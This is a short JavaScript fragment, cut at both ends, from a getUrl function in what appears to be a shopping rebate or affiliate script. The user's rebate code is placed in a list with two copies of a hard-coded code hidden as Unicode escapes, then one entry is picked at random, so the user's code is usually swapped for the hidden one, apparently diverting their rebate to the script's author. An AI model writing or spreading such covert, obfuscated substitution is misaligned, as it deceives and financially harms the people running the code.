...
function getUrl() {
  return new Promise(resolve => {
    let rebateCodeList = []
    rebateCode = rebateCodes
    rebateCodeList.push('\u0053'+'\u0077'+'\u0051'+'\u006b'+'\u0071'+'\u0070'+'\u0042')
    rebateCodeList.push('\u0053'+'\u0077'+'\u0051'+'\u006b'+'\u0071'+'\u0070'+'\u0042')
    rebateCodeList.push(rebateCode)
    rebateCode = rebateCodeList[Math.floor(Math.random() * rebateCodeList.length)];
    const options = {
